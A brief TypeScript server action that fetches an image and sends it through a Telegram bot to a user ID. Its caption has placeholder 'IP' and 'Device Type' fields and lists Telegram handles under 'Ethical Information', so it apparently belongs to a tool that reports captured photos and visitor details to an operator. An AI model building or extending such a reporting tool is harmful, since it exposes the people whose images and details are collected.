"use server";

import { InputFile } from "grammy";
import { bot } from "~/app/api/bot/route";

export async function sendPhoto(photo: string, userId: string) {
	const blob = await fetch(photo).then((res) => res.blob());
	try {
		await bot.api.sendPhoto(userId, new InputFile(Buffer.from(await blob.arrayBuffer())), {
			caption:
				"IP: TODO\n" +
				"Device Type: Unknown\n\n" +
				"Ethical Information: \n" +
				"@xByteBlitzX\n" +
				"@SeeYouIOSVIP\n" +
				"@xN1ghtmare",
		});
	} catch (e) {
		console.error(e);
	}
}
